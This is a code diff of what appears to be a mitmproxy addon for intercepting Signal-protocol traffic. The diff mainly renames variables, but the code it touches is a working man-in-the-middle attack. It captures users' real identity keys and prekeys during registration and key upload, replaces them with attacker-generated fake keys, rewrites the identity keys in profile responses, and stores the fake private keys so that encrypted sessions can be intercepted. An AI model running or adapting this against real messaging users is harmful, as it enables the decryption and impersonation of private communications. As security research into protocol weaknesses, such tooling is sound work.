@@ -6,8 +6,11 @@ import logging
 from mitmproxy.http import Request, Response, HTTPFlow
 from xepor import RouteType, HTTPVerb, Router
 import json
-# from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
-from signal_protocol import helpers
+# from signal_protocol import identity_key, curve, session_cipher, storage, state
+from signal_protocol.address import DeviceId, ProtocolAddress
+from signal_protocol.identity_key import IdentityKey, IdentityKeyPair
+from signal_protocol.curve import PublicKey
+from signal_protocol import helpers, state, kem
 from base64 import b64decode, b64encode
 from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
@@ -24,7 +27,8 @@ from protos.gen.WebSocketResources_pb2 import *
 
 # from server_proto import *
 from server_proto import addons, HOST_HTTPBIN
-from mitm_interface import *
+# from mitm_interface import *
+from mitm_interface import MitmUser
 from collections import defaultdict
 
 registration_info = dict()
@@ -50,41 +54,41 @@ websocket_open_state = defaultdict(PendingWebSocket)
 
 @dataclass
 class KeyData:
-    IdenKey: Optional[IdentityKeyPair] = None
-    SignedPreKey: Optional[dict] = None
-    pq_lastResortKey: Optional[dict] = None
-    PreKeys: Optional[dict] = None
-    pq_PreKeys: Optional[dict] = None
+    iden_key: Optional[IdentityKeyPair] = None
+    signed_pre_key: Optional[dict] = None
+    pq_last_resort_key: Optional[dict] = None
+    pre_keys: Optional[dict] = None
+    pq_pre_keys: Optional[dict] = None
 
-    fake_IdenKey: Optional[IdentityKeyPair] = None
-    fake_SignedPreKeys: Optional[dict] = None
-    fake_secret_SignedPreKeys: Optional[dict] = None
+    fake_iden_key: Optional[IdentityKeyPair] = None
+    fake_signed_pre_keys: Optional[dict] = None
+    fake_secret_signed_pre_keys: Optional[dict] = None
 
-    fake_PreKeys: Optional[dict] = None
-    fake_secret_PreKeys: Optional[dict] = None
+    fake_pre_keys: Optional[dict] = None
+    fake_secret_pre_keys: Optional[dict] = None
 
-    fake_pq_PreKeys: Optional[dict] = None
-    fake_secret_pq_PreKeys: Optional[dict] = None
+    fake_pq_pre_keys: Optional[dict] = None
+    fake_secret_pq_pre_keys: Optional[dict] = None
 
-    fake_lastResortKey: Optional[dict] = None
-    fake_secret_lastResortKey: Optional[dict] = None
+    fake_last_resort_key: Optional[dict] = None
+    fake_secret_last_resort_key: Optional[dict] = None
 
 
 @dataclass
 class RegistrationInfo:
     aci: Optional[str] = None
     pni: Optional[str] = None
-    unidentifiedAccessKey: Optional[str] = None
+    unidentified_access_key: Optional[str] = None
 
-    aciData: Optional[KeyData] = None
-    pniData: Optional[KeyData] = None
+    aci_data: Optional[KeyData] = None
+    pni_data: Optional[KeyData] = None
 
 
 @dataclass
 class BobIdenKey:
     uuid: str
-    identityKey: Optional[IdentityKeyPair] = None
-    fake_identityKey: Optional[IdentityKeyPair] = None
+    identity_key: Optional[IdentityKeyPair] = None
+    fake_identity_key: Optional[IdentityKeyPair] = None
 
 
 api = addons[0]
@@ -97,53 +101,53 @@ def _v1_registration(flow: HTTPFlow):
     req = json.loads(flow.request.content)
     # logging.info(json.dumps(req, indent=4))
 
-    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']
+    unidentified_access_key = req['accountAttributes']['unidentifiedAccessKey']
 
-    aci_IdenKey = req['aciIdentityKey']
-    pni_IdenKey = req['pniIdentityKey']
+    aci_iden_key = req['aciIdentityKey']
+    pni_iden_key = req['pniIdentityKey']
 
-    aci_SignedPreKey = req['aciSignedPreKey']
-    pni_SignedPreKey = req['pniSignedPreKey']
+    aci_signed_pre_key = req['aciSignedPreKey']
+    pni_signed_pre_key = req['pniSignedPreKey']
 
-    aci_pq_lastResortKey = req['aciPqLastResortPreKey']
-    pni_pq_lastResortKey = req['pniPqLastResortPreKey']
+    aci_pq_last_resort_key = req['aciPqLastResortPreKey']
+    pni_pq_last_resort_key = req['pniPqLastResortPreKey']
 
-    aci_fake_IdenKey = IdentityKeyPair.generate()
-    pni_fake_IdenKey = IdentityKeyPair.generate()
+    aci_fake_iden_key = IdentityKeyPair.generate()
+    pni_fake_iden_key = IdentityKeyPair.generate()
 
-    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)
+    fake_signed_pre_keys, fake_secret_signed_pre_keys = helpers.create_registration(aci_fake_iden_key, pni_fake_iden_key)
 
     req.update(fake_signed_pre_keys)
 
     registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
-        unidentifiedAccessKey=unidentifiedAccessKey,
-        aciData=KeyData(
-            IdenKey=aci_IdenKey,
-            SignedPreKey=aci_SignedPreKey,
-            pq_lastResortKey=aci_pq_lastResortKey,
-            fake_IdenKey=aci_fake_IdenKey,
-            fake_SignedPreKeys=fake_signed_pre_keys["aciSignedPreKey"],
-            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
+        unidentified_access_key=unidentified_access_key,
+        aci_data=KeyData(
+            iden_key=aci_iden_key,
+            signed_pre_key=aci_signed_pre_key,
+            pq_last_resort_key=aci_pq_last_resort_key,
+            fake_iden_key=aci_fake_iden_key,
+            fake_signed_pre_keys=fake_signed_pre_keys["aciSignedPreKey"],
+            fake_secret_signed_pre_keys=fake_secret_signed_pre_keys["aciSignedPreKeySecret"],
             # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
-            # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
+            # fake_secret_PreKeys = fake_secret_signed_pre_keys["aciPreKeySecret"],
             # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
-            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
-            fake_lastResortKey=fake_signed_pre_keys["aciPqLastResortPreKey"],
-            fake_secret_lastResortKey=fake_secret_SignedPreKeys["aciPqLastResortSecret"]
+            # fake_secret_pq_PreKeys = fake_secret_signed_pre_keys["aciPqPreKeySecret"],
+            fake_last_resort_key=fake_signed_pre_keys["aciPqLastResortPreKey"],
+            fake_secret_last_resort_key=fake_secret_signed_pre_keys["aciPqLastResortSecret"]
         ),
-        pniData=KeyData(
-            IdenKey=pni_IdenKey,
-            SignedPreKey=pni_SignedPreKey,
-            pq_lastResortKey=pni_pq_lastResortKey,
-            fake_IdenKey=pni_fake_IdenKey,
-            fake_SignedPreKeys=fake_signed_pre_keys["pniSignedPreKey"],
-            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
+        pni_data=KeyData(
+            iden_key=pni_iden_key,
+            signed_pre_key=pni_signed_pre_key,
+            pq_last_resort_key=pni_pq_last_resort_key,
+            fake_iden_key=pni_fake_iden_key,
+            fake_signed_pre_keys=fake_signed_pre_keys["pniSignedPreKey"],
+            fake_secret_signed_pre_keys=fake_secret_signed_pre_keys["pniSignedPreKeySecret"],
             # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
-            # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
+            # fake_secret_PreKeys = fake_secret_signed_pre_keys["pniPreKeySecret"],
             # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
-            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
-            fake_lastResortKey=fake_signed_pre_keys["pniPqLastResortPreKey"],
-            fake_secret_lastResortKey=fake_secret_SignedPreKeys["pniPqLastResortSecret"]
+            # fake_secret_pq_PreKeys = fake_secret_signed_pre_keys["pniPqPreKeySecret"],
+            fake_last_resort_key=fake_signed_pre_keys["pniPqLastResortPreKey"],
+            fake_secret_last_resort_key=fake_secret_signed_pre_keys["pniPqLastResortSecret"]
         )
 
     )
@@ -168,9 +172,9 @@ def _v1_registration(flow: HTTPFlow):
         aci=resp["uuid"],
         pni=resp["pni"],
         deviceId=1,
-        aciIdenKey=registration_info[ip_address].aciData.IdenKey,
-        pniIdenKey=registration_info[ip_address].pniData.IdenKey,
-        unidentifiedAccessKey=registration_info[ip_address].unidentifiedAccessKey,
+        aciIdenKey=registration_info[ip_address].aci_data.iden_key,
+        pniIdenKey=registration_info[ip_address].pni_data.iden_key,
+        unidentifiedAccessKey=registration_info[ip_address].unidentified_access_key,
     )
 
     user.on_conflict_replace().execute()
@@ -191,10 +195,10 @@ def _v2_keys(flow: HTTPFlow):
     if not registration_info.get(ip_addr):
         logging.error(f"Address {ip_addr} not found in registration_info. {registration_info}")
 
-    key_data = registration_info[ip_addr].aciData if identity == "aci" else registration_info[ip_addr].pniData
+    key_data = registration_info[ip_addr].aci_data if identity == "aci" else registration_info[ip_addr].pni_data
 
     try:
-        alice_identity_key_pair = key_data.fake_IdenKey
+        alice_identity_key_pair = key_data.fake_iden_key
     except KeyError:
         logging.exception(f"{flow} AND {registration_info}")
         return
@@ -202,39 +206,39 @@ def _v2_keys(flow: HTTPFlow):
     pq_pre_keys = req["pqPreKeys"]
     pre_keys = req["preKeys"]
 
-    key_data.pq_PreKeys = pq_pre_keys
-    key_data.PreKeys = pre_keys
+    key_data.pq_pre_keys = pq_pre_keys
+    key_data.pre_keys = pre_keys
 
     fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(100, alice_identity_key_pair)
 
     req.update(fake_pre_keys)
 
-    key_data.fake_PreKeys = fake_pre_keys["preKeys"]
-    key_data.fake_secret_PreKeys = fake_secret_pre_keys["preKeys"]
-    key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
-    key_data.fake_secret_pq_PreKeys = fake_secret_pre_keys["pqPreKeys"]
+    key_data.fake_pre_keys = fake_pre_keys["preKeys"]
+    key_data.fake_secret_pre_keys = fake_secret_pre_keys["preKeys"]
+    key_data.fake_pq_pre_keys = fake_pre_keys["pqPreKeys"]
+    key_data.fake_secret_pq_pre_keys = fake_secret_pre_keys["pqPreKeys"]
 
     legit_bundle = LegitBundle.insert(
         type=identity,
         aci=registration_info[ip_addr].aci,
-        deviceId=1,  # todo: shouldnt be static
-        IdenKey=key_data.IdenKey,
-        SignedPreKey=key_data.SignedPreKey,
-        PreKeys=key_data.PreKeys,
-        kyberKeys=key_data.pq_PreKeys,
-        lastResortKyber=key_data.pq_lastResortKey
+        deviceId=1,  # todo: shouldn't be static
+        IdenKey=key_data.iden_key,
+        SignedPreKey=key_data.signed_pre_key,
+        PreKeys=key_data.pre_keys,
+        kyberKeys=key_data.pq_pre_keys,
+        lastResortKyber=key_data.pq_last_resort_key
     )
 
     mitm_bundle = MitMBundle.insert(
         type=identity,
         aci=registration_info[ip_addr].aci,
-        deviceId=1,  # todo: shouldnt be static
-        FakeIdenKey=(b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
-                     b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")),
-        FakeSignedPreKey=(key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
-        FakePrekeys=(key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
-        fakeKyberKeys=(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys),
-        fakeLastResortKyber=(key_data.fake_lastResortKey, key_data.fake_secret_lastResortKey)
+        deviceId=1,  # todo: shouldn't be static
+        FakeIdenKey=(b64encode(key_data.fake_iden_key.public_key().serialize()).decode("utf-8"),
+                     b64encode(key_data.fake_iden_key.private_key().serialize()).decode("utf-8")),
+        FakeSignedPreKey=(key_data.fake_signed_pre_keys, key_data.fake_secret_signed_pre_keys),
+        FakePrekeys=(key_data.fake_pre_keys, key_data.fake_secret_pre_keys),
+        fakeKyberKeys=(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys),
+        fakeLastResortKyber=(key_data.fake_last_resort_key, key_data.fake_secret_last_resort_key)
     )
 
     legit_bundle.on_conflict_replace().execute()
@@ -259,7 +263,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     fake_victims = {}
     for _id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-        fake_victim = MitmUser(address.ProtocolAddress("1", 1))
+        fake_victim = MitmUser(ProtocolAddress("1", 1))
         fake_victims[_id] = fake_victim
         bob_registration_id = bundle["registrationId"]
 
@@ -274,7 +278,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         bob_bundle = state.PreKeyBundle(
             bob_registration_id,
-            address.DeviceId(_id),
+            DeviceId(_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
             state.SignedPreKeyId(1),
             PublicKey.deserialize(bob_signed_pre_key_public),
@@ -295,9 +299,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
         )
         legit_bundle.on_conflict_replace().execute()
-        fake_victim.process_pre_key_bundle(address.ProtocolAddress(uuid, _id), bob_bundle)
+        fake_victim.process_pre_key_bundle(ProtocolAddress(uuid, _id), bob_bundle)
 
-    # TODO: Swap the prekeybundle
+    # TODO: Swap the pre_key_bundle
 
     mitm_bundles = {}
 
@@ -311,12 +315,12 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         if not identity_key:
             # TODO: create row
-            fake_user = MitmUser(address=address.ProtocolAddress(uuid, _id))
+            fake_user = MitmUser(address=ProtocolAddress(uuid, _id))
             # identity_key = fake_user.pre_key_bundle.identity_key()
             identity_key = fake_user.identity_key_pair
 
         else:
-            fake_user = MitmUser(address=address.ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
+            fake_user = MitmUser(address=ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
         fake_bundle = fake_user.pre_key_bundle.to_dict()
@@ -390,27 +394,27 @@ def _v1_websocket(flow, msg):
     logging.warning(f"Websocket req with id {_id} and path {path}")
 
 
-def _v1_ws_my_profile(flow, identifier, version, credential_request):
+def _v1_ws_profile_with_credential(flow, identifier, version, credential_request):
     logging.info(f"my profile: {identifier} {version} {credential_request}")
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
 
-    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
+    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
 
-    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
+    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
     flow.response.content = json.dumps(resp).encode()
     return flow.response.content
 
 
-def _v1_ws_profile_futut(flow, identifier, version):
+def _v1_ws_versioned_profile(flow, identifier, version):
     logging.info(f"my profile 2: {identifier} {version}")
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
 
-    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
+    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
 
-    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
+    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
     flow.response.content = json.dumps(resp).encode()
     return flow.response.content
 
@@ -435,7 +439,7 @@ def _v1_ws_profile(flow, identifier):
     else:
         fake_iden_key = IdentityKeyPair.generate()
         bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_iden_key)
-        public_fake_iden_key = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
+        public_fake_iden_key = b64encode(bobs_bundle[uuid].fake_identity_key.public_key().serialize()).decode("utf-8")
 
     logging.info(f"BUNDLE: {bundle}")
     content["identityKey"] = public_fake_iden_key
@@ -514,12 +518,15 @@ def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
 ws_resp = Router()
 
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
-                  _v1_ws_my_profile, None)
-ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
-ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
+                  _v1_ws_profile_with_credential, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_versioned_profile,
+                  None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile,
+                  None)
 
 ws_req = Router()
-ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message,
+                 None)
 
 logging.warning(f"ROUTES (REQ): {ws_req.routes}")
 logging.warning(f"ROUTES (RESP): {ws_resp.routes}")
